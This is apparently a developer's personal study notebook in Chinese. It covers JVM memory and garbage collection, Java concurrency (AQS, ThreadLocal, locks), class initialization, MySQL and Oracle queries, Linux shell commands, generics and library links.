JVM运行时数据区分类

程序计数器 (Program Counter (PC) Register)
JVM栈 (Java Virtual Machine Stacks)
堆内存 (Heap Memory)
方法区 (Method Area)
运行时常量池 (Run-time Constant Pool)
本地方法栈 (Native Method Stacks)

程序计数器 是唯一一个不抛出OutOfMemoryError的运行时数据区

一个栈帧随着一个方法的调用开始而创建,这个方法调用完成而销毁栈帧内存放者方法中的局部变量,操作数栈等数据

JVM栈只对栈帧进行存储,压栈和出栈操作栈内存的大小可以有两种设置,固定值和根据线程需要动态增长

StackOverflowError 出现在栈内存设置成固定值的时候,当程序执行需要的栈内存超过设定的固定值会抛出这个错误
OutOfMemoryError 出现在栈内存设置成动态增长的时候,当JVM尝试申请的内存大小超过了其可用内存时会抛出这个错误

程序计数器用来记录当前正在执行的指令

单个线程私有 程序计数器, JVM栈还有本地方法栈

堆数据区是用来存放对象和数组（特殊的对象）
栈内存用来存储局部变量和方法调用
--------------------------------------------------------------------------------------
静态变量随类型信息存放在方法区中, 生命周期很长
栈指的是整个线程的执行栈, 栈帧是栈中的一个单位, 每个方法对应一个栈帧
--------------------------------------------------------------------------------------
gc收集器
单线程收集器
并行收集器(吞吐量为目标)  -XX:+UseParallelGC 暂停时间会变得比较长
并发收集器(gc pause短) -XX:+UseConcMarkSweepGC 内存碎片和浮动垃圾
--------------------------------------------------------------------------------------
JDK 6中的substring 内存泄露
当调用substring方法的时候,会创建一个新的string对象,但是这个string的值仍然指向堆中的同一个字符数组
这两个对象中只有count和offset 的值是不同的

JDK 7 中的substring
substring方法会在堆内存中创建一个新的数组
--------------------------------------------------------------------------------------
防止重复发送 Ajax 请求
利用jquery ajaxPrefilter中断请求
var pendingRequests = {};
$.ajaxPrefilter(function( options, originalOptions, jqXHR ) {
    var key = options.url;
    console.log(key);
    if (!pendingRequests[key]) {
        pendingRequests[key] = jqXHR;
    }else{
        //jqXHR.abort();    //放弃后触发的提交
        pendingRequests[key].abort();   // 放弃先触发的提交
    }

    var complete = options.complete;
    options.complete = function(jqXHR, textStatus) {
        pendingRequests[key] = null;
        if ($.isFunction(complete)) {
        complete.apply(this, arguments);
        }
    };
});

局限性：仅仅是前台防止jquery的ajax请求对于非jquery的ajax请求,不起作用
--------------------------------------------------------------------------------------
目录下的文件从大到小排序
ls -Slh
h 以容易理解的格式列出文件大小
-S 根据文件大小排序

du -hm --max-depth=2 | sort -rn
m以MB为单位输出

find /home/www/logs/ -size +500M -print0 | xargs -0 du -h | sort -nr

xargs -0将\0作为定界符
-print0 使用’\0’作为文件的定界符
-print使用’\n’作为文件的定界符
--------------------------------------------------------------------------------------
linux特殊字符
touch -- -abc.txt
touch ./-abc.txt
rm ./-*

touch ./#abc.txt
touch '#abc.txt'

mv ./#bc.txt ./#cd.txt

touch ./';abc.txt'
touch ';abc.txt'

touch +12.txt
touch %12.txt
touch '$12.txt'

touch '!12.txt'
touch '@12.txt'
touch ~1a.txt
touch '15".txt'

包含空格
touch hi\ my\ name\ is\ avishek.txt
scp localhost:'f/a\ b\ c'

ssh 127.0.0.1 grep "\" \"" /tmp/1

--------------------------------------------------------------------------------------
rm
-i, --interactive 进行交互式删除
--------------------------------------------------------------------------------------
对外提供接口的api如何保证幂等
如银联提供的付款接口：需要接入商户提交付款请求时附带：source来源,seq序列号source+seq在数据库里面做唯一索引,防止多次付款,(并发时,只能处理一个请求)
重点：对外提供接口为了支持幂等调用,接口有两个字段必须传,一个是来源source,一个是来源方序列号seq,这个两个字段在提供方系统里面做联合唯一索引,这样当第三方调用时,先在本方系统里面查询一下,是否已经处理过,返回相应处理结果；没有处理过,进行相应处理,返回结果注意,为了幂等友好,一定要先查询一下,是否处理过该笔业务,不查询直接插入业务系统,会报错,但实际已经处理了
--------------------------------------------------------------------------------------
唯一索引,防止新增脏数据
token机制,防止页面重复提交 redis要用删除操作来判断token
--------------------------------------------------------------------------------------
经常扩展的常量类用java类不用枚举
枚举在增加变量,新老版本,序列化,反序列化中不太友好
--------------------------------------------------------------------------------------
show binlog events in 'mysql-bin.000009';
--------------------------------------------------------------------------------------
子类负责修改共享变量（a single atomic value to represent state）,其操作必须是原子的（通过getState()、setState()和compareAndSetState()方法）
AQS负责线程阻塞队列（FIFO）的维护,线程阻塞和唤醒（queuing and blocking mechanics）
AQS支持多种工作模式及其组合,包括共享模式、排他模式、是否支持中断、是否超时

独占锁的功能：
有且只有一个线程获取到锁,其余线程全部挂起,直到该拥有锁的线程释放锁,被挂起的线程被唤醒重新开始竞争锁
ReentrantLock使用的就是AQS的独占API实现的

共享锁被头节点获取后,就在唤醒自身节点对应的线程的同时,继续唤醒AQS队列中的下一个节点的线程,
每个节点在唤醒自身的同时还会唤醒下一个节点对应的线程,以实现共享状态的"向后传播",
从而实现共享功能比如：ReentrantReadWriteLock

ReentrantReadWriteLockSync的内部类继承了AQS
ReentrantReadWriteLock来说分别代表读锁ReadLock和写锁WriteLock,
当队列中的头节点为读锁时,代表读操作可以执行,而写操作不能执行,因此请求写操作的线程会被挂起
,当读操作依次推出后,写锁成为头节点,请求写操作的线程被唤醒,可以执行写操作,
而此时的读请求将被封装成Node放入AQS的队列中如此往复,实现读写锁的读写交替进行

CountDownLatch是一种共享锁
ReentrantReadWriteLock是同时包含排它锁和共享锁特性的一种锁
ReentrantReadWriteLock的写锁时，使用的便是排它锁的特性；
使用ReentrantReadWriteLock的读锁时，使用的便是共享锁的特性

--------------------------------------------------------------------------------------
INSERT INTO c (c.aID,c.d,c.e,c.f) SELECT b.aID,b.d,b.e,b.f FROM b WHERE b.aID<5000000
 ON duplicate KEY UPDATE c.d=VALUES(c.d),c.e=VALUES(c.e),c.f=VALUES(c.f)
--------------------------------------------------------------------------------------
mysql查看表列
show columns from db_ap_plcy_fileinfo
show index from db_ap_plcy_fileinfo

show table status;

开启查询日志
select * from mysql.general_log

mysql执行次数最多sql
 select *
   from (select argument, count(*) as number
           from mysql.general_log
          group by argument) t
  order by number DESC;

--------------------------------------------------------------------------------------
逃逸分析的基本行为就是分析对象动态作用域：当一个对象在方法中被定义后,它可能被外部方法所引用,例如作为调用参数传递到其他地方中,称为方法逃逸
public static StringBuffer craeteStringBuffer(String s1, String s2) {
        StringBuffer sb = new StringBuffer();
        sb.append(s1);
        return sb;
    }

--------------------------------------------------------------------------------------
当变量的编译时类型和运行时类型不同时,当通过该变量来访问它所引用的对象的实例变量时,
该实例变量的值由声明它的类型决定,但当通过该变量来访问它所引用对象的实例方法时,
该方法行为将由它所引用的对象类型决定
--------------------------------------------------------------------------------------
年轻代的垃圾回收叫 Young GC, 年老代的垃圾回收叫 Full GC
在年轻代中经历了N次（可配置）垃圾回收后仍然存活的对象,就会被复制到年老代中
因此,可以认为年老代中存放的都是一些生命周期较长的对象

持久代溢出原因  动态加载了大量Java类而导致溢出
持久带中主要存放用于存放静态类型数据,如 Java Class, Method

持久代 大量的class导致持久代的空间的不足引起的 OutOfMemoryError:PermGen Space
 XX:MaxPermSize=XXXM  -XX:PermSize和-XX:MaxPermSize

jinfo -flag MaxPermSize 7476

-XX:+CMSClassUnloadingEnabled CMS垃圾回收机制的时候是否启用类卸载功能 -XX:+UseConcMarkSweepGC

运行时常量池溢出
while (true ){
     list.add(String. valueOf(i++).intern());
   }
方法区溢出 cglib不断创建类Enhancer
--------------------------------------------------------------------------------------
类加载器是在持久代空间里面加载类的
--------------------------------------------------------------------------------------
堆溢出(OutOfMemoryError:java heap space)
直接内存区OOM  unsafe.allocateMemory(10*1024*1024);-XX:MaxDirectMemorySize
--------------------------------------------------------------------------------------
-XX:+HeapDumpOnOutOfMemoryError参数当OOM时转储堆数据
--------------------------------------------------------------------------------------
使用JVM参数-XX:+PrintGCDetails可以打印GC日志
使用JVM参数-XX:+HeapDumpOnOutOfMemoryError可以在OOM时打印堆转储文件   -XX:HeapDumpPath

--------------------------------------------------------------------------------------
数据处理中提升性能的方法
先导出到文件,在文件上计算然后再导入
将大文件分片成小文件,然后每个文件分配给单个线程单独处理 资源隔离
--------------------------------------------------------------------------------------
MySQL的select导出时,会自动把\t和\n转义成\\t和\\n
--------------------------------------------------------------------------------------
test -e filename 文件存在
test -f filename 文件存在 常规文件
--------------------------------------------------------------------------------------
数据库遵循的是两段锁协议,将事务分成两个阶段,加锁阶段和解锁阶段（所以叫两段锁）
加锁阶段：在该阶段可以进行加锁操作在对任何数据进行读操作之前要申请并获得S锁（共享锁,其它事务可以继续加共享锁,但不能加排它锁）,在进行写操作之前要申请并获得X锁（排它锁,其它事务不能再获得任何锁）加锁不成功,则事务进入等待状态,直到加锁成功才继续执行
解锁阶段：当事务释放了一个封锁以后,事务进入解锁阶段,在该阶段只能进行解锁操作不能再进行加锁操作

两段锁协议可以保证事务的并发调度是串行化

MVCC（多版本并发控制）

事务是用来保证数据的一致性
锁是保证数据的并发
--------------------------------------------------------------------------------------
dcl double-checked locking 指令重排序
由于编译器优化了程序指令, 允许对象在构造函数未调用完前, 将共享变量的引用指向部分构造的对象, 虽然对象未完全实例化, 但已经不为null了.

--------------------------------------------------------------------------------------
ThreadLocal创建的变量只能被当前线程访问,其他线程则无法访问和修改
ThreadLocalMap 位于堆上
使用InheritableThreadLocal可以实现多个线程访问ThreadLocal的值
使用InheritableThreadLocal可以将某个线程的ThreadLocal值在其子线程创建时传递过去

实现单个线程单例以及单个线程上下文信息存储,比如交易id等
实现线程安全,非线程安全的对象使用ThreadLocal之后就会变得线程安全,因为每个线程都会有一个对应的实例
承载一些线程相关的数据,避免在方法中来回传递参数

void set(T value)
T get()以及
T initialValue()
remove()

在ThreadLocal类中有一个Map,用于存储每一个线程的变量副本,Map中元素的键为线程对象,而值对应线程的变量副本

--------------------------------------------------------------------------------------
线程安全  指的是在多线程环境下,一个类在执行某个方法时,对类的内部实例变量的访问是安全的
线程安全  指当多个线程在程序中运行的时候,其运行结果与单线程的运行结果一致

ThreadLocal为每个线程的中并发访问的数据提供一个副本,通过访问副本来运行业务 不能解决线程同步的问题
Synchronized用于线程间的数据共享,而ThreadLocal则用于线程间的数据隔离
同步机制采用了"以时间换空间"的方式,
ThreadLocal采用了"以空间换时间"的方式

编写线程安全的代码,其核心在于要对共享（Shared）、可变(Mutable)状态访问操作进行管理

--------------------------------------------------------------------------------------
类的初始化
加载（Loading）,由类加载器执行,查找字节码,并创建一个Class对象（只是创建）；
链接（Linking）,验证字节码,为静态域分配存储空间（只是分配,并不初始化该存储空间）,解析该类创建所需要的对其它类的应用；
初始化（Initialization）,首先执行静态初始化块static{},初始化静态变量,执行静态方法（如构造方法）
--------------------------------------------------------------------------------------
类加载器的加载顺序有两种,
一种是父类优先策略, 类在加载某个Java类之前,会尝试代理给其父类加载器,只有当父类加载器找不到时,才尝试自己去加载
一种是是自己优先策略,首先尝试子类加载,找不到的时候才要父类加载器去加载,这种在web容器（如tomcat）中比较常见
--------------------------------------------------------------------------------------
-Djavax.xml.parsers.SAXParserFactory=org.apache.xerces.jaxp.SAXParserFactoryImpl
--------------------------------------------------------------------------------------
动态代理生成注解实现类(可设置System.setProperty("sun.misc.ProxyGenerator.saveGeneratedFiles", "true")查看
--------------------------------------------------------------------------------------
BeanFactory是spring的顶层接口,ApplicationContext是子接口
FactoryBean工厂bean返回的是该FactoryBean的getObject方法所返回的对象
感知容器的状态和直接使用容器,ApplicationContextAware,可以在Bean中得到Bean所在的应用上下文,从而直接在Bean中使用上下文的服务
--------------------------------------------------------------------------------------
Semaphore实现原理
Semaphore不是可重入的每一次请求一个许可都会导致计数器减少1,同样每次释放一个许可都会导致计数器增加1,一旦达到了0,新的许可请求线程将被挂起应用场景：固定线程池、对象池
--------------------------------------------------------------------------------------
编译器和cpu的指令重排序遵循数据依赖性 写后读、写后写、读后写都不能重排序
--------------------------------------------------------------------------------------
LockSupport,和wait/notify区别
LockSupport的park/unpark不需要获取对象的监视器
LockSupport阻塞的线程,notify/notifyAll没法唤醒
--------------------------------------------------------------------------------------
线程1调用reentrantLock.lock时,线程被加入到AQS的等待队列中
线程1调用await方法被调用时,该线程从AQS中移除,对应操作是锁的释放
接着马上被加入到Condition的等待队列中,因为该线程需要signal信号
线程2,因为线程1释放锁的关系,被唤醒,并判断可以获取锁,于是线程2获取锁
线程2调用signal方法,这个时候Condition的等待队列中只有线程1一个节点,于是它被取出来,并被加入到AQS的等待队列中
 注意,这个时候,线程1 并没有被唤醒
signal方法执行完毕,线程2调用reentrantLock.unLock()方法,释放锁这个时候因为AQS中只有线程1,
于是,AQS释放锁后按从头到尾的顺序唤醒线程时,线程1被唤醒,于是线程1恢复执行
直到释放所整个过程执行完毕
--------------------------------------------------------------------------------------
http://www.cnblogs.com/zhguang/p/3154584.html 初始化
--------------------------------------------------------------------------------------
避免在类还未初始化完成时从内部实例化该类或在初始化过程中引用还未初始化的字段
--------------------------------------------------------------------------------------
class Foo {
	int i = 0;
}

public class Bar extends Foo {
	int i = 1;
	public static void main(String... args) {
		Foo foo = new Bar();
		System.out.println(foo.i);//0
	}
}
diplay 重写方法输出 1
--------------------------------------------------------------------------------------
有static先初始化static,然后是非static的
显式初始化（如果有的话）,构造块初始化（如果有的话）,最后调用构造函数进行初始化

父类static成员 -> 子类static成员 -> 父类普通成员初始化和初始化块 -> 父类构造方法 -> 子类普通成员初始化和初始化块 -> 子类构造方法
--------------------------------------------------------------------------------------
JVM要求,变量的读取和写入操作都必须是原子操作但是对于64位的long、double除外
多线程环境下使用共享的long和double类型变量是不安全的,除非使用关键字volatile,或者用锁进行保护

--------------------------------------------------------------------------------------
发布一个对象指的是对象能在当前作用域之外的代码中被使用
   公有静态变量,非私有方法返回引用,构造方法内隐含引用

逸出：当某个不该发布的对象被发布时就称为逸出

2种常见的对象逸出情况：在构造函数中注册事件监听,在构造函数中启动新线程

当内部类代码执行的时候,外部类对象的创建过程很有可能还没结束,这个时候如果内部类访问外部类中的数据,很有可能得到还没有正确初始化的数据

this逃逸就是说在构造函数返回之前其他线程就持有该对象的引用,调用尚未构造完全的对象的方法可能引发错误
public ThisEscape(){
        System.out.println(this);
        t = new Thread(){
            public void run(){
                System.out.println(ThisEscape.this);
            }
        };
        t.start();
}

正确的构造过程
public class SafeListener{
    private final EventListener listener;
    private SafeListener(){
        listener = new EventListener(){
            public void onEvent(Event e){
                doSomething(e);
            }
        };
    }
    public static SafeListener newInstance(EventSource source){
        SafeListener safe = new SafeListener();
        //当构造好了SafeListener对象（通过构造器构造）之后,我们才启动了监听线程
        source.registerListener(safe.listener);
        return safe;
    }
}

私有构造函数+公有工厂方法
public class ThisEscape {
    private final Thread t;
    private ThisEscape(){
        t = new Thread(){
            public void run(){
            }
        };
    }

    public static ThisEscape getInstance(){
        ThisEscape thisEscape = new ThisEscape();
        thisEscape.t.start();
        return thisEscape;
    }
}
--------------------------------------------------------------------------------------
读写锁,可以允许多个读操作或一个写操作相对于互斥锁只能有一个读操作,读写锁用于频繁读操作的数据

--------------------------------------------------------------------------------------
哈希值 散列冲突
hashcode==this.hashcode
--------------------------------------------------------------------------------------
code_value not null 更新报错
update bs_static_data set code_value = '' where code_type = '1'
--------------------------------------------------------------------------------------
SOA是一套服务架构体系它包括：应用程序前端、服务、服务库和服务总线一个服务包括一个合约、一个或多个接口、一个实现
应用程序前端：业务流程的所有者,APP、WEB等
服务库：管理多个SOA服务
服务总线：SOA服务的调度（Dubbo）
合约：服务实现功能的协议和约束
实现：业务的基础结构,包括业务逻辑和数据逻辑,对接口功能的实现
接口：对外公开的功能

--------------------------------------------------------------------------------------
重载 函数或者方法有同样的名称,但是参数列表不相同的情形
重写 指的是在Java的子类与父类中有两个名称、参数列表都相同的方法的情况
重载是一个编译期概念、重写是一个运行期间概念 重载是编译时多态
--------------------------------------------------------------------------------------
反向测试是指刻意编写问题代码, 来验证鲁棒性和能否正确的处理错误.
--------------------------------------------------------------------------------------
packageIdList.addAll(Arrays.asList(packageIds.split("\\D")));
\\D 非数字
--------------------------------------------------------------------------------------
当一个系统宕掉之后,手动的切换到冗余或者备份系统,这个过程称之为Switchover(切换)
如果是自动切换,不需要人工干预,那么称之为failover(故障转移)
原系统恢复之后,从备份系统切换回去的过程称之为Failback 故障恢复

--------------------------------------------------------------------------------------
CAP 定理
一致性（Consistency）：所有节点同一时间看到是相同的数据；
可用性（Availability）：不管是否成功,确保每一个请求都能接收到响应；
分区容错性（Partition tolerance）：系统任意分区后,在网络故障时,仍能操作

牺牲分区（CA 模型）

举例：
单站点数据库
集群数据库
LDAP
xFS 文件系统
实现方式：

两阶段提交
缓存验证协议

牺牲可用性（CP 模型）
举例：

分布式数据库
分布式锁定
绝大部分协议
实现方式：

悲观锁
少数分区不可用

牺牲一致性（AP 模型）

举例：
Coda
Web 缓存
DNS

实现方式：
到期/租赁
解决冲突
乐观
--------------------------------------------------------------------------------------
同步和异步
描述的是用户线程与内核的交互方式：

同步是指用户线程发起 I/O 请求后需要等待或者轮询内核 I/O 操作完成后才能继续执行；
异步是指用户线程发起 I/O 请求后仍继续执行,当内核 I/O 操作完成后会通知用户线程,或者调用用户线程注册的回调函数

阻塞和非阻塞
描述的是用户线程调用内核 I/O 操作的方式：

阻塞是指 I/O 操作需要彻底完成后才返回到用户空间；
非阻塞是指 I/O 操作被调用后立即返回给用户一个状态值,无需等到 I/O 操作彻底完成

--------------------------------------------------------------------------------------
跨域
<filter>
  <filter-name>CorsFilter</filter-name>
  <filter-class>org.apache.catalina.filters.CorsFilter</filter-class>
</filter>
<filter-mapping>
  <filter-name>CorsFilter</filter-name>
  <url-pattern>/*</url-pattern>
</filter-mapping>

--------------------------------------------------------------------------------------
https://github.com/kilim/kilim
--------------------------------------------------------------------------------------
通常程序如何支持高并发？
一种是基于操作系统提供的多进程或者多线程的机制,每个任务占据一个进程或一个线程,
  当任务中有IO等等待操作的时候,将进程或者线程放入调度队列,
  坏处就是如果想支持高并发的并发量,不得不创建很多的进程或者线程,
  而进程或者线程又消耗了大量的资源,同时大量的进程或者线程,
  需要花费很多时间在上下文切换上,切换动作需要做状态的保持和恢复,很是消耗资源

一种是每个任务不完全占据一个进程或者线程,当任务在执行过程中,
  需要等待IO等资源时,任务将所占据的进程或者线程释放,以便其他任务使用这个进程或者线程,
  这种方式的好处在于可以减少所需要的原生的进程或者线程数,并且切换完全自行来实现

什么是协程（Coroutine）？
  每个任务不完全占据一个进程或者线程,当任务在执行过程中,需要等待IO等资源时,任务将所占据的进程或者线程释放,以便其他任务使用这个进程或者线程

多数都采用了Actor Module来实现,每个任务就是一个Actor,Actor之间通过消息来进行交互,而不是采用共享的方式Actor可以看做是一个轻量级的线程
--------------------------------------------------------------------------------------
什么场景下适合做协程序
 只有大量的处理线程,都消耗在等待后端的处理时,做异步化才有意义
--------------------------------------------------------------------------------------
Kilim是一个Java消息传递框架,它提供了超轻量级的线程和工具,可以在这些线程之间进行快速、安全、零复制的消息传递
Kilim的核心在于Mailbox跨线程共享内存,没有锁或同步,Mailbox支持多生产者,单消费者队列
--------------------------------------------------------------------------------------
myisampack是一个压缩使用MyISAM引擎表的工具 压缩后的表将会成为只读的,并且myisampack不支持分区表
myisampack  *.MYI
myisamchk -rq *.MYI 重新生成索引
--------------------------------------------------------------------------------------
mysql求年龄
select date_format(from_days(to_days(now()) - to_days('1990-3-1')), '%Y') + 0;
--------------------------------------------------------------------------------------
抽取class所有方法
javap java.packagename.classname
javap java.lang.StringBuffer
--------------------------------------------------------------------------------------
mysql只有查询权限
revoke all on tbl_user from user_2
grant select on tbl_user to user_2
--------------------------------------------------------------------------------------
tostring默认调用hashcode hashcode区分对象
object tostring方法
public String toString() {
	return getClass().getName() + "@" + Integer.toHexString(hashCode());
 }
--------------------------------------------------------------------------------------
System.setProperty("https.protocols", "TLSv1.1,TLSv1.2");
System.setProperty("jsse.enableSNIExtension", "false");

conn.addRequestProperty("Accept", "application/xml");
conn.setRequestProperty("Content-Type", "application/xml");
conn.setRequestProperty("Authorization", "Basic " + encoded);
--------------------------------------------------------------------------------------
myisam的索引长度最大为1000字节,
innodb的索引单列长度最大为767字节 总 3072字节
mysql表最大列数 1017
--------------------------------------------------------------------------------------
https://github.com/katharsis-project/katharsis-core
https://github.com/shred/acme4j
https://github.com/c-rack/bcd4j
https://github.com/brandtg/stl-java
https://github.com/xesam/RxJava-collection
https://github.com/swimit/recon-java
https://github.com/jhunters/jprotobuf
--------------------------------------------------------------------------------------
%2B (+) and %25(%)
+  URL 中+号表示空格 %2B
空格 URL中的空格可以用+号或者编码 %20
/  分隔目录和子目录 %2F
?  分隔实际的 URL 和参数 %3F
% 指定特殊字符 %25
# 表示书签 %23
& URL 中指定的参数间的分隔符 %26
= URL 中指定参数的值 %3D
--------------------------------------------------------------------------------------
boolean 1字节
byte    1字节
short   2字节
char    2字节 16位无符号的类型 0-65535
float   4字节
int     4字节
long    8字节
double  8字节

Void -> void -> V
Byte -> byte -> B
Character -> char -> C
Short -> short -> S
Integer -> int -> I
Long -> long -> J
Float -> float -> F
Double -> double -> D
Boolean -> boolean -> Z

java语言表达式所操作的boolean值,在编译之后都使用Java虚拟机中的int数据类型来代替,
而boolean数组将会被编码成Java虚拟机的byte数组,每个元素boolean元素占8位
boolean类型单独使用是4个字节,在数组中又是1个字节

boolean类型所占存储空间的大小没有明确指定,仅定义为能够取字面值true或false
--------------------------------------------------------------------------------------
http://my.oschina.net/xianggao/blog/524943?fromerr=fyD0jcw1 秒杀
--------------------------------------------------------------------------------------
http://www.open-open.com/lib/view/open1410485827242.html redis
--------------------------------------------------------------------------------------
zabbix proxy监控
--------------------------------------------------------------------------------------
https://github.com/tgsmith61591/clust4j 分类聚类算法
https://github.com/imsweb/algorithms 算法

http://git.oschina.net/eric_ds/jfire-codejson
https://github.com/Wolfgang-Schuetzelhofer/jcypher neo4j
https://github.com/jfaster/kid 接口耗时

https://github.com/toml-lang/toml toml配置文件
https://github.com/TheElectronWill/TOML-javalib/releases/

https://github.com/vojtechhabarta/typescript-generator

--------------------------------------------------------------------------------------
Redis：轻量级,高并发,延迟敏感
即时数据分析、秒杀计数器、缓存等

RabbitMQ：重量级,高并发,异步
批量数据异步处理、并行任务串行化,高负载任务的负载均衡等
--------------------------------------------------------------------------------------
近似最近邻问题相关算法
(一)Tree-Based Method, 筛选候选子集
vantage-Point Tree 回溯会比较多
k-d Tree kd tree 适用于维度比较低的情况
Random Projection Tree采用随机投影方法将每个节点中的数据投影到一维子空间,在子空间中进行划分该方法实践中效果比较好算法性能比较优秀

--------------------------------------------------------------------------------------
如果某个客户端的连接达到了max_connect_errors的限制,将被禁止访问
show variables like 'max_connect_errors';

阻止会一直生效,直到
flush hosts;
truncate table performance_schema.host_cach

通过\s查看当前连接使用的是socket还是TCP
Connection:             localhost via TCP/IP

--------------------------------------------------------------------------------------
https://github.com/RuedigerMoeller/kontraktor actor
https://github.com/ggrandes/figaro 很久没更新

--------------------------------------------------------------------------------------
jmap -heap pid命令查看 MaxHeapSize NewSize 等信息 打印heap空间的概要

--------------------------------------------------------------------------------------
https://github.com/tdebatty/java-string-similarity 字符串距离
--------------------------------------------------------------------------------------
tbschedule 淘宝任务调度
--------------------------------------------------------------------------------------
SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
df.setLenient(false);//严格模式
String dateStr = "2016-01-2019:25:49.254";
--------------------------------------------------------------------------------------
任务速度不一致时候 取最新数据 start-end create_date  start desc
--------------------------------------------------------------------------------------
Set是一个原始类型,而Set< ? >是一个无界通配符类型
Set  原始类型
Set<?> 泛型通配符 可以引用其他各种参数化的类型 不能调用与参数化有关的方法
Set<Object>  set typeof object 参数化类型,表示可以包含任何对象的一个集合

<? extends Number>用于匹配Number及Number的子类
<? super Integer>用于匹配Integer及Integer的父类

泛型  类型安全 消除强制类型转换

--------------------------------------------------------------------------------------
method="POST" enctype="multipart/form-data"

Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryZGDkB6nM3LvHX0KI
--------------------------------------------------------------------------------------
Serlvet Part的标准API包括：
（1）name：表单字段名；
（2）size：Part数据内容的大小；
（3）submittedFileName：Servlet 3.1新增方法,获取文件名,之前必须通过getHeader("content-disposition")解析
--------------------------------------------------------------------------------------
递归类型限制
Enum<E extends Enum<E>> 每个继承自Enum<E>的类型E
作为 Enum 的类型参数的类本身必须是 Enum 的子类型
任何扩展 Enum 的类必须传递它本身 作为类型参数

<T extends Comparable<T>> 表示的是：针对可以与自身进行比较的每个类型T T实现了Comparable接口

<T extends Comparable<? super T>> T能够和它的父类中的一个进行比较 T类型或者是T的父类型必须实现了Comparable接口

<T extends Object & Comparable<? super T>>  擦除为Object 擦除类型变量,并替换为第一个限定类型

递归类型限制,
 是使用包含某个参数类型本身的表达式去限制参数的类型

类的字面量只能用原生态类型而不是泛型
instanceof操作符只能跟原生态类型

数组的协变性(covariant)是指如果类Base是类Sub的基类,那么Base[]就是Sub[]的基类而泛型是不可变的(invariant)
数组是具体化的(reified),泛型在运行时是被擦除的(erasure) 数组是在运行时才去判断数组元素的类型约束,而泛型正好相反


不能实例化参数化类型的数组
如SaneseeDemo<Integer>[] array = new SaneseeDemo<Integer>[10];

泛型类
GenericClass<T,E>
--------------------------------------------------------------------------------------
对称加密算法中常用的算法有：
DES、3DES、TDEA、Blowfish、RC2、RC4、RC5、IDEA、SKIPJACK、AES

数据加密标准算法：DES 基于56位密钥的对称加密算法
DES分组加密 DES的密钥是固定8位的byte的,其中前7位是加解密用的,最后一位是校验码

3DES(TDEA)是三重数据加密算法 密钥的长度为原来的DES三倍

高级数据加密标准：AES 密钥长度越大,安全性越高,而加密和解密性能则越低

国际数据加密标准 IDEA
类似于三重DESIDEA采用128位长度的密钥 广泛用于电子邮件加密

非对称加密中使用的主要算法有：
RSA、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法)

--------------------------------------------------------------------------------------
mysql
show engine performance_schema status
#收集数据库服务器性能参数
performance_schema=OFF

query_cache_size=32M
key_buffer_size=32M表示索引缓冲区的大小
table_definition_cache=400存放当前已经打开的表句柄
table_open_cache=256存放表的定义信息是frm文件在内存中的映射
--------------------------------------------------------------------------------------
linux crontab格式
minute   hour   day   month   week   command

每隔两天的上午8点到11点的第3和第15分钟执行
3,15 8-11 */2 * * command

列出crontab 文件
crontab -l
--------------------------------------------------------------------------------------
https://github.com/markenwerk/java-utils-json-parser
https://github.com/graphhopper/jsprit 旅行者问题

https://github.com/org-badiff/badiff
https://github.com/swimit/recon-java
--------------------------------------------------------------------------------------
select d.name,
       to_char(d.create_date_a, 'yyyy-mm-dd hh24:mi:ss') || '-' ||
       to_char(d.create_date_b, 'yyyy-mm-dd hh24:mi:ss'),
       d.time_diff
  from (select c.name,
               c.create_date_a,
               c.create_date_b,
               nvl(lead(c.create_date_b, 1)
                   over(partition by c.name order by c.create_date_a),
                   c.create_date_b + 1) as next_create_date,
               c.time_diff
          from (select b.*,
                       (b.create_date_b - b.create_date_a) * 24 * 60 as time_diff
                  from (select b.name,
                               b.create_date as create_date_b,
                               nvl(a.create_date, trunc(b.create_date, 'dd')) as create_date_a
                          from test_statis_tb b
                          left join test_statis_tb a
                            on b.name = a.name
                           and b.create_date > a.create_date) b
                 where trunc(b.create_date_b, 'dd') =
                       trunc(create_date_a, 'dd')) c
         where c.time_diff <= 30
         order by c.name, c.create_date_a) d
 where (d.next_create_date - d.create_date_a) > 30 / 24 / 60

--临时表 获取姓名 年月日(用于分组)
with tmp_static_date as
 (select name,
         to_char(create_date, 'yyyy-mm-dd') as create_date_str,
         create_date
    from test_statis_tb)
select c.name,
       to_char(trunc(create_date) +
               --拼接时间范围
               greatest(time_range - 1, 0) * 30 / (24 * 60),
               'yyyy-mm-dd hh24:mi:ss') || '-' ||
       to_char(create_date, 'yyyy-mm-dd hh24:mi:ss') as create_date_range,
       c.create_date
  from (select name,
               create_date_str,
               create_date,
               ceil((create_date - trunc(create_date)) * 24 * 60 / 30) time_range, --本次分段
               --上一个分段值
               nvl(lag(ceil((create_date - trunc(create_date)) * 24 * 60 / 30),
                       1) over(partition by name,
                        create_date_str order by create_date),
                   -1) as pre_time_range,
               --下一个分段值
               nvl(lead(ceil((create_date - trunc(create_date)) * 24 * 60 / 30),
                        1) over(partition by name,
                        create_date_str order by create_date),
                   100) as next_time_range
          from tmp_static_date) c
 where c.time_range != c.next_time_range --记录在分段唯一
   and c.time_range != c.pre_time_range
 order by name, create_date


--------------------------------------------------------------------------------------
Void类是一个不可实例化的占位符类,它持有对标识Java关键字void的Class对象的引用
--------------------------------------------------------------------------------------
java中打开SecurityManager的方法
-Djava.security.manager

关闭
SecurityManager sm=System.getSecurityManager();
if(sm!=null){
    System.setSecurityManager(null);
}

虚拟机启动时,首先通过检查系统属性java.security.manager来确定SecurityManager是否打开了
如果打开了,那么SecurityManager实例将被创建,它可以被用来检查不同的权限
默认情况下,SecurityManager是关闭的

--------------------------------------------------------------------------------------
java.util.Date和Java.sql.Date的区别：
java.sql.Date是java.util.Date的子类
java.util.Date类型的可以是日期时间
而java.sql.Date只有日期没有时间
--------------------------------------------------------------------------------------
枚举类型可通过接口来定义行为
--------------------------------------------------------------------------------------
net.sf.json解析json时候会尝试解析字符串,看看是不是json对象
String content = "{\"retinfo\":{\"retmsg\":\"[182096|]处理失败,原因:[屏蔽具体的失败原因！]\"}}";
JSONObject object = JSONObject.fromObject(content);
System.out.println(object.toString());
结果为:
 {"retinfo":{"retmsg":["182096|"]}}
--------------------------------------------------------------------------------------
jsch关闭
session.disconnect()
--------------------------------------------------------------------------------------
进入目录package内部 反编译
javap -classpath . -v Normal_Out_Class$Inner_Class.class
-classpath .   说明在当前目录下寻找要反编译的class文件
-v   加上这个参数输出的信息比较全面包括常量池和方法内的局部变量表, 行号, 访问标志

--------------------------------------------------------------------------------------
事务等待获取资源等待的最长时间 单位是秒
